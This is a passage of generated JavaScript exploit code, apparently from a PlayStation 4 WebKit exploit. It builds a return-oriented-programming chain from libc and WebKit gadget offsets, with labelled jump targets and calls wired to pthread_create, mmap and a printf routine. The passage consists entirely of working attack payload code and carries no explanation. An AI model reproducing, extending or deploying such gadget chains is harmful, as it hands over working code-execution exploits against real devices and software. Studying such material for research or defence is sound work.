libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+154848, //L2305-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2305:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2306:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+155008, //L2309-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+154976, //L2307-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+154992, //L2308-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2307:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2308:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2309:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L2311:
ropchain+155128, //L2310
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+86480, //_create_extcall
//L2310:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+155200, //L2314-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2312:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+757614,); //pop rcx
//L2314:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+155304, //L2317-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+155288, //L2316-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2316:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2317:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+155448, //L2320-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+155416, //L2318-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+155432, //L2319-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2318:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2319:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2320:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L2321:
jop_frame_addr,
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+155592, //L2324-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2322:
db([24, 0]); // 0x18
set_gadget(libc_base+757614,); //pop rcx
//L2324:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+155696, //L2327-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+155680, //L2326-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2326:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2327:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+155840, //L2330-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+155808, //L2328-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+155824, //L2329-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2328:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2329:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2330:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+155936, //L2333-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2331:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L2333:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+156040, //L2336-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+156024, //L2335-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2335:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2336:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+156184, //L2339-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+156152, //L2337-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+156168, //L2338-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2337:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2338:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2339:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L2341:
ropchain+156304, //L2340
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+157136, //L2342
//L2340:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+156424, //L2344-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+156440, //L2345-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+156408, //L2343-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2343:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2344:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2345:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+156544, //L2346-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+156576, //L2348-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+156560, //L2347-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2346:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2347:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2348:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+156672, //L2349-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+156688, //L2350-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2349:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2350:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+156800, //L2351-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+156784, //L2352-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2352:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2351:
db([0, 0]); // 0x0
set_gadgets([
libc_base+362222, //pop rsi
ropchain+156888, //L2354-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+156872, //L2353-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2353:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2354:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+156984, //L2355-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+157000, //L2356-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2355:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2356:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+157112, //L2357-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+157096, //L2358-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2358:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2357:
db([0, 0]); // 0x0
//L2342:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+157960, //L2359
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+157768, //L2360
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+157784, //L2361
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+157800, //L2362
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+157816, //L2363
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+157832, //L2364
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+157848, //L2365
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+157880, //L2366
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
pthread_create_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+157872, //L2367
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+157928, //L2368
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+157944, //L2369
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L2360:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L2361:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L2362:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2363:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L2364:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L2365:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L2367:
db([0, 0]); // 0x0
//L2366:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+157912, //L2370
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L2370:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2368:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L2369:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2359:
db([0, 0]); // 0x0
//L2132:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+158792, //L2371
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+158600, //L2372
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+158616, //L2373
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+158632, //L2374
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+158648, //L2375
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+158664, //L2376
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+158680, //L2377
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+158712, //L2378
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
mmap_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+158704, //L2379
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+158760, //L2380
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+158776, //L2381
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L2372:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L2373:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L2374:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2375:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L2376:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L2377:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L2379:
db([0, 0]); // 0x0
//L2378:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+158744, //L2382
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L2382:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2380:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L2381:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2371:
db([0, 0]); // 0x0
//__putchar:
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+158848, //L2383-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L2383:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+158936, //L2385-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+158952, //L2386-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2385:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L2386:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2387:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2388:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+159080, //L2390-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+159064, //L2389-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2389:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2390:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+159216, //L2393-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+159184, //L2391-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2391:
db([0, 0]); // 0x0
set_gadgets([
libc_base+155394, //pop rdi
//L2392:
ropchain+144, //_ps4_printf_fd
libc_base+467092 //pop rax
]);
//L2393:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+159384, //L2396-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+159400, //L2397-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+159352, //L2394-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+159368, //L2395-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2394:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2395:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2396:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2397:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+159472, //L2398-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+159488, //L2399-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2398:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2399:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+159592, //L2400-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+159624, //L2402-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+159608, //L2401-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2400:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2401:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2402:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+19066556, //cmp rax, rcx ; setb al
webkit_base+2766990, //setle al
libc_base+227029, //movzx eax, al
libc_base+362222, //pop rsi
ropchain+159792, //L2404-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+159808, //L2405-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+159776, //L2403-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2403:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2404:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2405:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+159912, //L2407-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+159960, //L2410-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+159944, //L2409-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2407:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L2408:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2409:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2410:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+227029, //movzx eax, al
webkit_base+4571187, //shl rax, 3
libc_base+362222, //pop rsi
ropchain+160088, //L2411+8
libc_base+499086, //add rax, rsi
libc_base+751703, //mov rax, [rax]
libc_base+362222, //pop rsi
ropchain+160064, //L2411-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+766440 //pop rsp
]);
//L2411:
db([0, 0]); // 0x0
set_gadgets([
ropchain+160104, //L2411+24
ropchain+160928, //L2406
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+160128, //L2412-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2412:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2413:
db([1, 0]); // 0x1
set_gadget(libc_base+155394,); //pop rdi
//L2414:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+160256, //L2416-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+160240, //L2415-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2415:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2416:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+160352, //L2418-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L2417:
db([16, 0]); // 0x10
set_gadget(libc_base+467092,); //pop rax
//L2418:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+160496, //L2421-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+160464, //L2419-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2419:
db([0, 0]); // 0x0
set_gadgets([
libc_base+155394, //pop rdi
//L2420:
ropchain+144, //_ps4_printf_fd
libc_base+467092 //pop rax
]);
//L2421:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+160664, //L2424-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+160680, //L2425-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+160632, //L2422-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+160648, //L2423-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2422:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2423:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2424:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2425:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+160776, //L2427-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+160760, //L2426-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2426:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2427:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L2429:
ropchain+160896, //L2428
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+163312, //L2430
//L2428:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
